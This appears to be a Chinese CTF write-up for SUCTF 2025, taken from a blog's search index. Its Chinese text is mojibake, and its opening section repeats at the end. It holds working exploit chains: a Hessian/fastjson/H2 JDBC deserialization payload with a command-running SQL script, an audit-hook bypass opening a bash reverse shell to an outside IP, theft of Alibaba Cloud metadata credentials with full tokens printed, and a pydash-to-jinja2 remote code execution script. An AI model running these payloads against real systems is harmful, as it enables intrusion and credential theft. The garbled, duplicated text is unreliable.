é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"SUCTFWP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; 